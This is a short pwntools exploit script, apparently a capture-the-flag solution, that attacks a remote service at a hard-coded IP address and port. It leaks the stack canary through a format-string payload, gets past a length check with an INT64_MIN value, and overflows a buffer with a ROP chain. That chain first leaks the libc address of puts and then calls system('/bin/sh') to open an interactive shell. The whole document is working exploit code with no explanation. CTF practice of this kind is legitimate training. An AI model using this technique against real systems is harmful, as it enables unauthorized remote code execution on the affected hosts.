from pwn import *
context.log_level = "debug"
# p = process("./exploit_1")
p = remote("118.25.216.151" , 10001)
elf = ELF("./exploit_1")
libc = ELF("./libc.so.6")

payload = "%15$p" 
p.recvuntil("name:\n")
p.sendline(payload)
p.recvuntil("Hello ")
canary = int(p.recvuntil("please" , drop = True) , 16)

int64_max = -9223372036854775808
p.recvuntil("motto:\n")
p.sendline(str(int64_max))

pop_rdi = 0x0000000000400fa3
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

payload = "a" * (0x410-8) + p64(canary) + "a" * 8
payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) 
payload += p64(0x400DA0)

p.recvuntil(" motto:\n")
p.sendline(payload)

puts_addr = u64(p.recvuntil("\n" , drop = True).ljust(8 , "\x00"))
print(hex(puts_addr))
libc_base = puts_addr - libc.sym["puts"]
system = libc_base + libc.sym["system"]
str_bin_sh = libc_base + libc.search("/bin/sh").next()

int64_max = -9223372036854775808
p.recvuntil("motto:\n")
p.sendline(str(int64_max))

pop_rdi = 0x0000000000400fa3
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

payload = "a" * (0x410-8) + p64(canary) + "a" * 8
payload += p64(pop_rdi) + p64(str_bin_sh) + p64(system) 

p.recvuntil(" motto:\n")
p.sendline(payload)

p.interactive()